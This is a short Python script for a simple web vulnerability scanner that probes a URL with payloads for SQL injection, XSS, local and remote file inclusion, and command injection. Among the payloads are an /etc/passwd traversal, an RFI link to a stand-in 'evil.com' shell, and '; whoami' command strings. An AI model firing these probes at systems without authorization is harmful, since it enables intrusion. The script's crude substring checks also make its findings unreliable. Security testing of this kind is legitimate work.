import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
import re

def web_vulnerability_scanner(url):
    def is_vulnerable(response):
        errors = ["you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark after the character string", "quoted string not properly terminated", "sql syntax", "mysql_fetch_assoc()", "mysql_fetch_array()", "mysql_num_rows()", "mysql_result()"]
        for error in errors:
            if error in response.content.decode().lower():
                return True
        return False

    def scan_sql_injection(url):
        payloads = ["'", "\"", "';", "\";"]
        for payload in payloads:
            new_url = f"{url}{payload}"
            response = requests.get(new_url)
            if is_vulnerable(response):
                return f"SQL Injection possible: {new_url}"
        return None

    def scan_xss(url):
        payloads = ["<script>alert('XSS')</script>", "<script>alert(1)</script>"]
        for payload in payloads:
            response = requests.get(url, params={"search": payload})
            if payload in response.content.decode():
                return f"XSS possible: {url}?search={payload}"
        return None

    def scan_lfi(url):
        payloads = ["../../../../etc/passwd", "../../../../etc/passwd%00"]
        for payload in payloads:
            response = requests.get(url, params={"page": payload})
            if "root:" in response.content.decode():
                return f"LFI possible: {url}?page={payload}"
        return None

    def scan_rfi(url):
        payloads = ["http://evil.com/shell.php", "http://evil.com/shell.php%00"]
        for payload in payloads:
            response = requests.get(url, params={"url": payload})
            if "evil.com" in response.content.decode():
                return f"RFI possible: {url}?url={payload}"
        return None

    def scan_command_injection(url):
        payloads = ["; ls", "; whoami", "| ls", "| whoami"]
        for payload in payloads:
            response = requests.get(url, params={"cmd": payload})
            if "root" in response.content.decode() or "home" in response.content.decode():
                return f"Command Injection possible: {url}?cmd={payload}"
        return None

    results = {}
    results["SQL Injection"] = scan_sql_injection(url)
    results["XSS"] = scan_xss(url)
    results["LFI"] = scan_lfi(url)
    results["RFI"] = scan_rfi(url)
    results["Command Injection"] = scan_command_injection(url)

    return {k: v for k, v in results.items() if v is not None}

try:
    url = "http://example.com"
    vulnerabilities = web_vulnerability_scanner(url)
    if vulnerabilities:
        print(vulnerabilities)
    else:
        print("No vulnerabilities found.")
except Exception as e:
    print(f"An error occurred: {e}")